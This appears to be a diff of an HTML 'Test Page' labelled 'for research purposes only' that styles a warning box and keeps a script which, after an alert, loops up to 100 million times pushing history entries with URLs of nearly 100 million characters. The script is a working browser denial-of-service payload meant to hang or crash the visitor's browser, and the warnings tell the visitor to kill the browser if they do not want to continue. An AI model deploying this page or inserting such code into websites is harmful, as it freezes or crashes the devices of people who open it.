@@ -1,18 +1,60 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Page</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #f0f0f0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 2rem;
+            color: #4caf50;
+            text-shadow: 0 0 10px #4caf50;
+        }
+
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff5555;
+            padding: 1rem 2rem;
+            border: 1px solid #ff5555;
+            border-radius: 8px;
+            max-width: 600px;
+            text-align: center;
+            font-weight: bold;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        }
+    </style>
+</head>
 <body>
     <h1>Hello world!</h1>
-    <h3>This is just an simple page!</h3>
+    <div class="warning">
+        ⚠️ For research purposes only!<br>
+        If you want to continue, press OK in the alert.<br>
+        Otherwise, close your browser with Alt+F4 or Task Manager.
+    </div>
+
     <script>
         async function test() {
             for (let i = 0; i < 100000000; i++) {
                 await new Promise((resolve) => {
-                    history.pushState("", "", "-".repeat(99999999));
+                    history.pushState("", "", "0".repeat(99999999));
                     resolve();
-                })
+                });
             }
         }
 
-        alert("Hi! For research purposes only! Try to wait longer than 10 seconds and press OK!")
+        alert("⚠️ For research purposes only! If you want to continue press OK, else close your browser with Alt+F4 or Task Manager.");
 
         setTimeout(() => {
             test();
